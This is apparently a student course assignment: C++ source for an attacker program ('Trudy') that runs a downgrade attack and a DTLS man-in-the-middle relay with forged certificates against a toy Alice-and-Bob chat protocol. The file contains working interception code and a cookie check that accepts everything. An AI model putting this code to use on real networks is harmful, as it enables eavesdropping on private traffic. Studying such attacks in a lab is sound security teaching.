// Kritik Agarwal - CS23MTECH11009
// Girish Thatte - CS22MTECH11005
// Naveen Naik - CS23MTECH11011
// Importing the required libraries
#include <iostream>        // For standard input/output
#include <openssl/ssl.h>   // For OpenSSL library functions
#include <openssl/err.h>   // For OpenSSL error handling
#include <openssl/bio.h>   // For OpenSSL BIO functions
#include <openssl/pem.h>   // For OpenSSL PEM functions
#include <openssl/dtls1.h> // For DTLS functions
#include <openssl/x509.h>  // For X509 certificate functions
#include <openssl/rand.h>  // For OpenSSL random number generation
#include <sys/socket.h>    // For socket functions
#include <sys/time.h>      // For time functions
#include <netinet/in.h>    // For internet address functions
#include <arpa/inet.h>     // For internet address functions
#include <netdb.h>         // For network database functions
#include <cstring>         // For string functions
#include <string.h>        // For string functions
#include <unistd.h>        // For POSIX functions
#include <cstdlib>         // For standard library functions
#include <stdio.h>         // For standard input/output
#include <stdlib.h>        // For standard library functions

using namespace std;

#define CHAT_HELLO "chat_hello"
#define CHAT_OK_REPLY "chat_ok_reply"
#define CHAT_START_SSL "chat_START_SSL"
#define CHAT_START_SSL_ACK "chat_START_SSL_ACK"
#define CHAT_CLOSE "chat_close"
#define CHAT_START_SSL_NOT_SUPPORTED "chat_START_SSL_NOT_SUPPORTED"

#define PORT 8080
#define BUFF_SIZE 1024
#define ROOT_STORE "CA-Certs.pem"

#define FAKE_ALICE_CERT "fakealice.pem"
#define FAKE_BOB_CERT "fakebob.pem"
#define FAKE_ALICE_PRIVATE_KEY "fakealice-private-key.pem"
#define FAKE_BOB_PRIVATE_KEY "fakebob-private-key.pem"

struct rcvFunStruct
{
    ssize_t recvfrom_flag;
    char buf[1024];
};

void error(string msg)
{
    cerr << "<!>" << msg << endl;
    exit(EXIT_FAILURE);
}

// Function to generate a cookie
static int generateCookie(SSL *ssl, unsigned char *cookie, unsigned int *cookie_len)
{
    // Generate a random cookie of 16 bytes using OpenSSL random number generator function
    unsigned char rand_cookie[16];
    RAND_bytes(rand_cookie, sizeof(rand_cookie));

    // Copy the random cookie to the cookie variable and set the cookie length to 16 bytes (size of the random cookie)
    memcpy(cookie, rand_cookie, sizeof(rand_cookie));
    *cookie_len = sizeof(rand_cookie);

    return 1; // Return 1 to indicate success
}

// Function to verify the received cookie
static int verifyCookie(SSL *ssl, const unsigned char *cookie, unsigned int cookie_len)
{
    // Always accept the received cookie for simplicity
    return 1;
}

// Function to create a new session
int myNewSess(SSL *ssl, SSL_SESSION *session)
{
    unsigned int session_id_length;
    const unsigned char *session_id = SSL_SESSION_get_id(session, &session_id_length);
    return 0;
}

// Function to send a message
int sendMsg(int unixSock, struct sockaddr_in *destAddr, socklen_t destLen, std::string msg)
{
    ssize_t sendto_flag;
    // cout << sizeof(*msg) << endl;
    sendto_flag = sendto(unixSock, msg.c_str(), msg.size(), 0, reinterpret_cast<struct sockaddr *>(destAddr), destLen);
    if (sendto_flag < 0)
        error("sendto error");

    cout << "</> Sent message: " << msg << endl;
    return sendto_flag;
}

// Function to receive a message
rcvFunStruct rcvdMsg(int unixSock, struct sockaddr_in *srcAddr, socklen_t *srcLen)
{
    rcvFunStruct resp;
    memset(resp.buf, 0, sizeof(resp.buf));
    resp.recvfrom_flag = recvfrom(unixSock, resp.buf, sizeof(resp.buf), 0, reinterpret_cast<struct sockaddr *>(srcAddr), srcLen);
    if (resp.recvfrom_flag < 0)
        error("recvfrom error");

    cout << "</> Received message: " << resp.buf << endl;

    return resp;
}

// Function to initialize SSL
void initSSL()
{
    SSL_load_error_strings();
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
}

// Function to receive a message using SSL
rcvFunStruct rcvdMsgSSL(SSL *ssl)
{
    rcvFunStruct resp;
    memset(resp.buf, 0, sizeof(resp.buf));
    resp.recvfrom_flag = SSL_read(ssl, resp.buf, sizeof(resp.buf));
    if (resp.recvfrom_flag <= 0)
        error("SSL_read error");

    cout << "</> Received a SSL message: " << resp.buf << endl;

    return resp;
}

// Function to send a message using SSL
int sendMsgSSL(SSL *ssl, const char *msg)
{
    int ssl_write_flag;

    ssl_write_flag = SSL_write(ssl, msg, strlen(msg));
    if (ssl_write_flag <= 0)
        error("SSL_write error");

    cout << "</> Sent a SSL message: " << msg << endl;
    return ssl_write_flag;
}

// Function to initialize the server SSL context
SSL_CTX *initializeServerSSLContext()
{
    SSL_CTX *ctx;

    ctx = SSL_CTX_new(DTLS_server_method());
    if (!ctx)
    {
        error("Error Creating context");
    }
    SSL_CTX_set_min_proto_version(ctx, DTLS1_2_VERSION); // Set the minimum DTLS protocol version to DTLS 1.2
    SSL_CTX_set_max_proto_version(ctx, DTLS1_2_VERSION); // Set the maximum DTLS protocol version to DTLS 1.2

    SSL_CTX_set_security_level(ctx, 1);
    SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_SERVER);
    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
    SSL_CTX_set_cookie_generate_cb(ctx, generateCookie);
    SSL_CTX_set_cookie_verify_cb(ctx, &verifyCookie);

    if (SSL_CTX_use_certificate_file(ctx, FAKE_BOB_CERT, SSL_FILETYPE_PEM) <= 0)
    {
        error("Error Loading Server Cert");
    }

    if (SSL_CTX_use_PrivateKey_file(ctx, FAKE_BOB_PRIVATE_KEY, SSL_FILETYPE_PEM) <= 0)
    {
        error("Error Loading Server Key");
    }

    if (!SSL_CTX_check_private_key(ctx))
    {
        error("Error Server key and cert do not match");
    }

    if (!SSL_CTX_load_verify_locations(ctx, ROOT_STORE, NULL))
    {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
    return ctx;
}

// Function to initialize the SSL context
SSL_CTX *initSSLContext()
{
    SSL_CTX *ctx;

    ctx = SSL_CTX_new(DTLS_client_method());
    SSL_CTX_set_min_proto_version(ctx, DTLS1_2_VERSION); // Set the minimum DTLS protocol version to DTLS 1.2
    SSL_CTX_set_max_proto_version(ctx, DTLS1_2_VERSION); // Set the maximum DTLS protocol version to DTLS 1.2
    if (!ctx)
    {
        error("Error Creating context");
    }

    SSL_CTX_set_security_level(ctx, 1);
    SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_CLIENT);
    SSL_CTX_sess_set_new_cb(ctx, myNewSess);
    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);

    if (SSL_CTX_use_certificate_file(ctx, FAKE_ALICE_CERT, SSL_FILETYPE_PEM) <= 0)
    {
        error("Error Loading Client Cert");
    }

    if (SSL_CTX_use_PrivateKey_file(ctx, FAKE_ALICE_PRIVATE_KEY, SSL_FILETYPE_PEM) <= 0)
    {
        error("Error Loading Client Key");
    }

    if (!SSL_CTX_check_private_key(ctx))
    {
        error("Error Client key and cert do not match");
    }

    if (!SSL_CTX_load_verify_locations(ctx, ROOT_STORE, NULL))
    {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
    return ctx;
}

// Function to launch the downgrading attack
void interceptLaunch(const char *cliName, const char *srvName)
{
    int t_cliSock, t_srvSock, t_srvLen;
    struct sockaddr_in t_srv, a_srv, a_cli;
    socklen_t a_srvSize = sizeof(a_srv), t_srvSize = sizeof(t_srv), a_cliSize = sizeof(a_cli);

    t_cliSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (t_cliSock < 0)
        error("Socket error");

    // Setup server address
    a_srv.sin_family = AF_INET;
    struct hostent *hp = gethostbyname(srvName);
    if (hp == nullptr)
        error("Unknown Server");
    memcpy(&a_srv.sin_addr, hp->h_addr, hp->h_length);
    a_srv.sin_port = htons(PORT);

    t_srvSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (t_srvSock < 0)
        error("Opening socket");

    t_srvLen = sizeof(t_srv);
    memset(&t_srv, 0, t_srvLen);
    t_srv.sin_family = AF_INET;
    t_srv.sin_addr.s_addr = INADDR_ANY;
    t_srv.sin_port = htons(PORT);

    // Bind socket
    if (bind(t_srvSock, reinterpret_cast<struct sockaddr *>(&t_srv), t_srvLen) < 0)
    {
        cerr << "<!> Binding Error" << endl;
        close(t_srvSock);
        exit(EXIT_FAILURE);
    }
    cout << "<~> Server socket binded..." << endl;

    char msg[1024];

    while (true)
    {
        // receive msg from alice
        rcvFunStruct client_resp = rcvdMsg(t_srvSock, &a_cli, &a_cliSize);
        if (strcasecmp(client_resp.buf, CHAT_START_SSL) == 0)
        {
            // send msg to alice
            string msg3(CHAT_START_SSL_NOT_SUPPORTED);
            sendMsg(t_srvSock, &a_cli, a_cliSize, msg3);
            // receive msg from alice
            rcvFunStruct client_resp2 = rcvdMsg(t_srvSock, &a_cli, &a_cliSize);
            // send msg to bob
            sendMsg(t_cliSock, &a_srv, t_srvSize, client_resp2.buf);
        }
        else if (strcasecmp(client_resp.buf, CHAT_CLOSE) == 0)
        {
            string closeMsg(CHAT_CLOSE);
            sendMsg(t_cliSock, &a_srv, a_srvSize, closeMsg);
            close(t_cliSock);
            close(t_srvSock);
            exit(EXIT_SUCCESS);
        }
        else if (strcasecmp(client_resp.buf, CHAT_HELLO) == 0)
        {
            // send msg to bob
            string msg(CHAT_HELLO);
            sendMsg(t_cliSock, &a_srv, t_srvSize, msg);

            // receive msg from bob
            rcvFunStruct server_resp = rcvdMsg(t_cliSock, &a_srv, &t_srvSize);
            if (strcmp(server_resp.buf, CHAT_OK_REPLY) == 0)
            {
                // send msg to alice
                string msg2(CHAT_OK_REPLY);
                sendMsg(t_srvSock, &a_cli, a_cliSize, msg2);
            }
            continue;
        }
        else
        {
            // send msg to bob
            sendMsg(t_cliSock, &a_srv, t_srvSize, client_resp.buf);
        }

        // receive msg from bob
        rcvFunStruct server_resp = rcvdMsg(t_cliSock, &a_srv, &t_srvSize);

        if (strcasecmp(server_resp.buf, CHAT_CLOSE) == 0)
        {
            string closeMsg(CHAT_CLOSE);
            sendMsg(t_srvSock, &a_cli, a_cliSize, closeMsg);
            close(t_cliSock);
            close(t_srvSock);
            exit(EXIT_SUCCESS);
        }

        // send msg to alice
        sendMsg(t_srvSock, &a_cli, a_cliSize, server_resp.buf);
        
        continue;
    }
}

// Function to launch the MITM attack
void mitmLaunch(const char *cliName, const char *srvName)
{
    int t_cliSock, t_srvSock, t_srvLen;
    struct sockaddr_in t_srv, a_srv, a_cli;
    struct timeval s_timeout, c_timeout;

    socklen_t a_srvSize = sizeof(a_srv), t_srvSize = sizeof(t_srv);
    socklen_t a_cliSize = sizeof(a_cli);

    t_cliSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (t_cliSock < 0)
        error("Socket error");

    // Setup server address
    a_srv.sin_family = AF_INET;
    struct hostent *hp = gethostbyname(srvName);
    if (hp == nullptr)
        error("Unknown Server");
    memcpy(&a_srv.sin_addr, hp->h_addr, hp->h_length);
    a_srv.sin_port = htons(PORT);

    t_srvSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (t_srvSock < 0)
        error("Opening socket");

    t_srvLen = sizeof(t_srv);
    memset(&t_srv, 0, t_srvLen);
    t_srv.sin_family = AF_INET;
    t_srv.sin_addr.s_addr = INADDR_ANY;
    t_srv.sin_port = htons(PORT);

    // Bind socket
    if (bind(t_srvSock, reinterpret_cast<struct sockaddr *>(&t_srv), t_srvLen) < 0)
    {
        perror("Binding Error");
        close(t_srvSock);
        exit(EXIT_FAILURE);
    }
    cout << "<~> Server socket binded..." << endl;

    char msg[1024];

    // receive msg from alice
    rcvFunStruct client_resp = rcvdMsg(t_srvSock, &a_cli, &a_cliSize);
    // send msg to bob
    sendMsg(t_cliSock, &a_srv, t_srvSize, client_resp.buf);
    // receive msg from bob
    rcvFunStruct server_resp = rcvdMsg(t_cliSock, &a_srv, &t_srvSize);
    // send msg to alice
    sendMsg(t_srvSock, &a_cli, a_cliSize, server_resp.buf);

    // receive msg from alice
    rcvFunStruct client_resp_2 = rcvdMsg(t_srvSock, &a_cli, &a_cliSize);
    // send msg to bob
    sendMsg(t_cliSock, &a_srv, t_srvSize, client_resp_2.buf);
    // receive msg from bob
    rcvFunStruct server_resp_2 = rcvdMsg(t_cliSock, &a_srv, &t_srvSize);

    if (strcmp(server_resp_2.buf, "chat_START_SSL_ACK") == 0)
    {
        // send msg to alice
        sendMsg(t_srvSock, &a_cli, a_cliSize, server_resp_2.buf);

        // CREATE SSL ON TRUDY SIDE
        initSSL();
        SSL_CTX *srv_ctx = initializeServerSSLContext();
        SSL *srv_ssl;

        s_timeout.tv_sec = 5;
        s_timeout.tv_usec = 0;

        // Create a BIO object for the socket
        BIO *bio = BIO_new_dgram(t_srvSock, BIO_NOCLOSE);
        BIO_ctrl(bio, BIO_CTRL_DGRAM_SET_RECV_TIMEOUT, 0, &s_timeout);
        if (!bio)
        {
            error("Error in creating bio");
        }

        cout << "<~> initSSL Done.." << endl;

        // Create a new SSL object for the connection
        srv_ssl = SSL_new(srv_ctx);
        if (srv_ssl == nullptr)
        {
            ERR_print_errors_fp(stderr);
            SSL_CTX_free(srv_ctx);
            close(t_srvSock);
            exit(EXIT_FAILURE);
        }

        SSL_set_options(srv_ssl, SSL_OP_COOKIE_EXCHANGE);
        SSL_set_bio(srv_ssl, bio, bio);
        SSL_set_mode(srv_ssl, SSL_MODE_AUTO_RETRY);

        // SSL_accept
        int ssl_accept_flag;
        ssl_accept_flag = SSL_accept(srv_ssl);
        if (ssl_accept_flag <= 0)
        {
            ERR_print_errors_fp(stderr);
            close(t_srvSock);
            exit(EXIT_FAILURE);
        }

        cout << "<~> SSL_accept Done" << endl;

        // receive msg from alice
        rcvFunStruct client_resp_3 = rcvdMsgSSL(srv_ssl);
        // send msg to bob
        sendMsgSSL(srv_ssl, client_resp_3.buf);

        cout << "<~> Chat established" << endl;
    }
    else
    {
        cout << "<~> Trudy received plain text. She cannot do anything!" << endl;
    }

    // send msg to bob
    sendMsg(t_cliSock, &a_srv, t_srvSize, client_resp_2.buf);
    // receive msg from bob
    rcvFunStruct server_resp_3 = rcvdMsg(t_cliSock, &a_srv, &t_srvSize);
    // send msg to alice
    sendMsg(t_srvSock, &a_cli, a_cliSize, server_resp_3.buf);

    // receive msg from alice
    rcvFunStruct client_resp_4 = rcvdMsg(t_srvSock, &a_cli, &a_cliSize);
    // send msg to bob
    sendMsg(t_cliSock, &a_srv, t_srvSize, client_resp_4.buf);
    // receive msg from bob
    rcvFunStruct server_resp_4 = rcvdMsg(t_cliSock, &a_srv, &t_srvSize);
    // send msg to alice
    sendMsg(t_srvSock, &a_cli, a_cliSize, server_resp_4.buf);

    // receive msg from alice
    rcvFunStruct client_resp_5 = rcvdMsg(t_srvSock, &a_cli, &a_cliSize);
    // send msg to bob
    sendMsg(t_cliSock, &a_srv, t_srvSize, client_resp_5.buf);
    // receive msg from bob
    rcvFunStruct server_resp_5 = rcvdMsg(t_cliSock, &a_srv, &t_srvSize);
    // send msg to alice
    sendMsg(t_srvSock, &a_cli, a_cliSize, server_resp_5.buf);
    close(t_cliSock);
    close(t_srvSock);
}

// Main function: Driver function to start the program
int main(int argc, char *argv[])
{
    // Validate the command line flags and display the error message if the flags are invalid
    if (argc != 4)
        cout << "<!> Invalid command line arguments.\n<~> Available command line arguments are either:\n1. -d <clienthostname> <serverhostname>\n2. -m <clienthostname> <serverhostname>\n"
             << endl;

    else if (argc == 4 && strcasecmp(argv[1], "-d") == 0)
    {
        // If the command line flag is -d, then start the downgrading attack
        cout << "<~> Starting Downgrading Attack..." << endl;
        cout << "<~> Attacker: Trudy" << endl;
        interceptLaunch(argv[2], argv[3]);
    }

    else if (argc == 4 && strcasecmp(argv[1], "-m") == 0)
    {
        // If the command line flag is -m, then start the MITM attack
        cout << "<~> Starting MITM Attack..." << endl;
        cout << "<~> Attacker: Trudy" << endl;
        mitmLaunch(argv[2], argv[3]);
    }
    else
    {
        // Display the error message if the command line flags are invalid
        cout << "<!> Invalid command line arguments.\n<~> Available command line arguments are either:\n1. -d <clienthostname> <serverhostname>\n2. -m <clienthostname> <serverhostname>\n"
             << endl;
    }

    return 0;
}
